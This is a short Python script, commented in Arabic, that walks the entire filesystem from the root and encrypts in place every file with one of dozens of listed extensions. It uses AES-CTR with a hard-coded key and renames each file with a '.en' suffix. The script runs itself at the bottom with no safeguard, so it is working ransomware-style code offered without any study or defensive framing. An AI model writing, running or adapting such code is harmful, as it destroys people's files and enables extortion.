import os
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter

# قائمة الامتدادات المستهدفة
ex_list = [
    '.php', '.html', '.txt', '.htm', '.aspx', '.asp', '.js', '.css', '.pgsql.txt',
    '.mysql.txt', '.pdf', '.cgi', '.inc', '.gif', '.jpg', '.swf', '.xml', '.cfm',
    '.xhtml', '.wmv', '.zip', '.axd', '.gz', '.png', '.doc', '.shtml', '.jsp', 
    '.ico', '.exe', '.csi', '.inc.php', '.config', '.jpeg', '.ashx', '.log', 
    '.xls', '.0', '.old', '.mp3', '.com', '.tar', '.ini', '.mp4', '.en'
]

# إزالة النقطة من الامتدادات مرة واحدة بكفاءة
target_extensions = {ext.lstrip('.').lower() for ext in ex_list}

# تشفير الملفات
def encrypt_file(file_path, key):
    block_size = 16
    iv = Random.get_random_bytes(8)  # CTR mode needs a nonce
    ctr = Counter.new(64, prefix=iv)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

    try:
        with open(file_path, "rb") as f:
            plaintext = f.read()

        ciphertext = cipher.encrypt(plaintext)

        with open(file_path, "wb") as f:
            f.write(iv + ciphertext)  # حفظ الـ IV في بداية الملف

        os.rename(file_path, file_path + ".en")

    except Exception as e:
        print(f"[!] خطأ في الملف: {file_path} -> {e}")

# البحث عن الملفات المستهدفة وتشفيرها
def find_and_encrypt_files(start_path='/', key=b'1111111111111111'):
    for root, dirs, files in os.walk(start_path):
        for file_name in files:
            extension = file_name.rsplit('.', 1)[-1].lower()
            if extension in target_extensions:
                full_path = os.path.join(root, file_name)
                encrypt_file(full_path, key)

# المفتاح المستخدم
key = b'1111111111111111'

# تشغيل البرنامج
find_and_encrypt_files('/')

